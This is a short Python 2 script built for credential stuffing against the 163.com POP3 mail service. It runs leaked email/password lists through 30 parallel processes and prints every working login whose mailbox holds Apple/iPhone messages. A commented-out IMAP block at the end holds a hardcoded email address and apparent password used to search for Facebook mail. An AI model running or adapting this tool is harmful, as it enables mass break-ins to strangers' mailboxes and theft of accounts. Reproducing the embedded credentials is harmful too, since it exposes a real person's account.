#!/usr/bin/env python

import poplib
import linecache
import sys
import time

process_num = 30
# multi-processes
from multiprocessing import Process, Queue
class Worker(object):
	def __init__(self, queue):
		self.queue = queue
		self.process_num = process_num
		self.count = 0

	def start(self):
		for i in range(self.process_num):
			p = Process(target = self.run)
			p.start()

	def run(self):
		while True:
			self.count += 1
			user = self.queue.get()
			print self.count,' ',user['username']
			server = poplib.POP3('pop3.163.com')
			try:
				name = user['username']
				passwd = user['password']
				server.user(name)
				server.pass_(passwd)
				server.noop()
				count = 0
				for i in server.list()[1]:
					count += 1
					head = str(server.top(i,1)[1]).upper()
					if head.find('APPLE') > -1 and head.find('IPHONE') > -1:
						print 'apple msg recieved : ',name,' ',passwd
						break
			except Exception, e:
				print user['username'],'get exception : ',e
			
			if self.queue.empty():
				break

if __name__ == '__main__':
	queue = Queue()

	start = int(sys.argv[1])
	end = int(sys.argv[2])

	emails = open('emails.txt')
	passwords = open('passwords.txt')
	
	for i in xrange(start):
		email = emails.readline()
		password = passwords.readline()

	email = emails.readline()
	password = passwords.readline()
	while email and password and start <= end:
		user = {'username':email.strip(),'password':password.strip()}
		queue.put(user)
		start += 1
		email = emails.readline()
		password = passwords.readline()

	Worker(queue).start()
	while not queue.empty():
		time.sleep(10)


	

	# import imaplib
	# server = imaplib.IMAP4('IMAP4.163.com')
	# server.login('56906950@163.com','guokuan@163')
	# server.select()
	# typ, data = server.search(None, 'FROM','Facebook')
	# for num in data[0].split():
	#     typ, data = server.fetch(num, '(RFC822)')
	#     print 'Message %s\n%s\n' % (num, data[0][1])
	# server.close()
	# server.logout()
